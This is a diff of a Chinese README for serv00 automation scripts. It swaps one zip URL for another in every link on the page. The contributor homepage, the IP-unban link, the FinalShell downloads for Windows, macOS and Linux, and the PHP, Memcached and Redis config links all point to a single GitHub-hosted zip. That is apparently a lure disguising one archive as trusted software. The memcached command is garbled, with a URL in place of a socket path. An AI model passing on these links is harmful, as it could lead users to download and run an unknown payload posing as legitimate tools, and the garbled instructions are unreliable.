@@ -16,23 +16,23 @@
 ]
 ```
 
-> 其中`panelnum`参数为面板编号，即为你所收到注册邮件的`panel*https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip`中的`*`数值。
+> 其中`panelnum`参数为面板编号，即为你所收到注册邮件的`panel*https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip`中的`*`数值。
 
 ## 贡献
 
 |姓名|主页|内容|
 | :------------: | :------------: | :------------: |
-|linzjian666|https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip|增加多面板支持|
+|linzjian666|https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip|增加多面板支持|
 
 ## 参考信息
 
 |  名称 |来源|地址|
 | :------------: | :------------: | :------------: |
-|Limkon|Github|https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip|
+|Limkon|Github|https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip|
 
 ## SSH登录不上
 
-> 登录不上是因为Ban IP, 点击此处解锁： [Ban](https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip)
+> 登录不上是因为Ban IP, 点击此处解锁： [Ban](https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip)
 
 > 还是登录不上的话： 请使用下方 `FinalShell`，并勾上 `智能海外加速`，登录失败在弹出框选择`取消`，在弹出框填入`[邮件中的SSH密码]`
 
@@ -44,24 +44,24 @@ FinalShell是一体化的的服务器,网络管理软件,不仅是ssh客户端,�
 
 云端同步,免费海外服务器远程桌面加速,ssh加速,本地化命令输入框,支持自动补全,命令历史,自定义命令参数
 
-- Windows X64版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- Windows X64版,下载地址: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-- macOS Arm版,支持m1,m2,m3 cpu,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- macOS Arm版,支持m1,m2,m3 cpu,下载地址: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-- macOS X64版,支持旧款intel cpu,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- macOS X64版,支持旧款intel cpu,下载地址: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-- Linux X64版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- Linux X64版,下载地址: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-- Linux Arm64版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- Linux Arm64版,下载地址: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-- Linux LoongArch64龙芯版,下载地址: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- Linux LoongArch64龙芯版,下载地址: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
 ## 其他服务
 
-- PHP配置: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- PHP配置: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-- Memcached配置: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- Memcached配置: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
 
-  启动：memcached -s https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip -d
+  启动：memcached -s https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip -d
 
-- Redis配置: <https://github.com/newbieyan13/serv00-auto-scripts/raw/refs/heads/main/serv00-vless/auto-scripts-serv-v2.9.zip>
+- Redis配置: <https://raw.githubusercontent.com/newbieyan13/serv00-auto-scripts/main/serv00-alist/scripts_serv_auto_v1.4.zip>
